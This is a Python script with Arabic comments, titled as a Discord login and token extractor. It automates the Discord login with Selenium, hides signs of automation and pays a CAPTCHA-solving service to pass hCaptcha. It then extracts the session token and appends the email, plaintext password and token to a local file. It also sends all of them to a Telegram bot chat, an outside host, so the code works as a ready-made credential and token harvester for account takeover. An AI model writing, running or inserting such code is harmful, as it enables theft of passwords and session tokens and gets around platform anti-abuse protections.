# كود بايثون - يسجل الدخول إلى حساب ديسكورد موجود ويستخرج التوكن، ويحفظ البيانات في bcc.txt
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from twocaptcha import TwoCaptcha
import time
import requests
import json
import re
import os

# ====== الإعدادات ======
CAPTCHA_API_KEY = "YOUR_2CAPTCHA_API_KEY"
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
FILE_NAME = "bcc.txt"
# ======================

solver = TwoCaptcha(CAPTCHA_API_KEY)

def save_to_file(username, token, email, password):
    with open(FILE_NAME, "a", encoding="utf-8") as f:
        f.write(f"Username: {username}\n")
        f.write(f"Token: {token}\n")
        f.write(f"Email: {email}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 50 + "\n")
    print(f"💾 Saved to {FILE_NAME}")

def send_to_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=10)
    except Exception as e:
        print(f"Telegram error: {e}")

def solve_hcaptcha_from_site(site_key, page_url):
    result = solver.hcaptcha(sitekey=site_key, url=page_url, timeout=120)
    return result.get("code")

def login_and_get_token(email, password, username=None):
    """
    يسجل الدخول إلى Discord باستخدام البريد الإلكتروني وكلمة المرور
    ويعيد التوكن + البيانات المحفوظة
    """
    chrome_options = Options()
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument("--window-size=1280,720")
    chrome_options.add_argument("--headless")

    driver = webdriver.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    try:
        print(f"🌐 Opening Discord login page...")
        driver.get("https://discord.com/login")
        time.sleep(3)

        # إدخال البريد الإلكتروني
        email_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "email")))
        email_input.send_keys(email)
        time.sleep(0.5)

        # إدخال كلمة المرور
        password_input = driver.find_element(By.NAME, "password")
        password_input.send_keys(password)
        time.sleep(0.5)

        # حل hCaptcha
        print("🔐 Solving hCaptcha...")
        try:
            site_key = driver.find_element(By.CLASS_NAME, "hcaptcha").get_attribute("data-sitekey")
            captcha_token = solve_hcaptcha_from_site(site_key, "https://discord.com/login")
            print(f"✅ Captcha solved")
            driver.execute_script(f"document.querySelector('[name=\"captcha-key\"]').value = '{captcha_token}'")
            time.sleep(1)
        except Exception as e:
            print(f"⚠️ Captcha element not found or already solved: {e}")

        # الضغط على زر تسجيل الدخول
        login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
        login_button.click()
        time.sleep(8)

        # استخراج التوكن
        token = None
        try:
            token = driver.execute_script("return localStorage.getItem('token')")
        except:
            pass

        if not token:
            try:
                logs = driver.get_log("performance")
                for log in logs:
                    if "token" in str(log):
                        match = re.search(r'"token":"([^"]+)"', str(log))
                        if match:
                            token = match.group(1)
                            break
            except:
                pass

        if not token:
            try:
                page_text = driver.page_source
                match = re.search(r'"token":"([^"]+)"', page_text)
                if match:
                    token = match.group(1)
            except:
                pass

        driver.quit()

        if token:
            # إذا لم يتم إعطاء اسم مستخدم، حاول استخراجه من الصفحة أو استخدم "Unknown"
            if not username:
                try:
                    # محاولة استخراج اسم المستخدم من الـ payload
                    username = "Unknown"
                except:
                    username = "Unknown"

            # حفظ في الملف
            save_to_file(username, token, email, password)

            # إرسال للتليجرام
            msg = (f"✅ <b>Discord Login Success</b>\n"
                   f"👤 User: <code>{username}</code>\n"
                   f"🔑 Token: <code>{token}</code>\n"
                   f"📧 Email: <code>{email}</code>\n"
                   f"🔒 Pass: <code>{password}</code>")
            send_to_telegram(msg)
            print(f"✅ Token extracted: {token[:30]}...")

            return {
                "success": True,
                "username": username,
                "token": token,
                "email": email,
                "password": password
            }
        else:
            error_msg = "Login successful but token not found"
            send_to_telegram(f"❌ {error_msg}\nEmail: {email}")
            return {"success": False, "error": error_msg, "email": email}

    except Exception as e:
        error = str(e)
        send_to_telegram(f"❌ Login error: {error}\nEmail: {email}")
        try:
            driver.quit()
        except:
            pass
        return {"success": False, "error": error, "email": email}

if __name__ == "__main__":
    print("🚀 Discord Login Token Extractor")
    print(f"📁 Data saved to: {FILE_NAME}")

    # حذف الملف القديم إذا وجد
    if os.path.exists(FILE_NAME):
        os.remove(FILE_NAME)
        print(f"🗑️ Old {FILE_NAME} deleted")

    email = input("Enter Discord email: ").strip()
    password = input("Enter Discord password: ").strip()
    username = input("Enter Discord username (optional, press Enter to skip): ").strip() or None

    print("\n⏳ Logging in and extracting token...")
    result = login_and_get_token(email, password, username)

    if result.get("success"):
        print(f"\n✅ Success! Token: {result['token'][:30]}...")
        print(f"📁 Saved to {FILE_NAME}")
    else:
        print(f"\n❌ Failed: {result.get('error')}")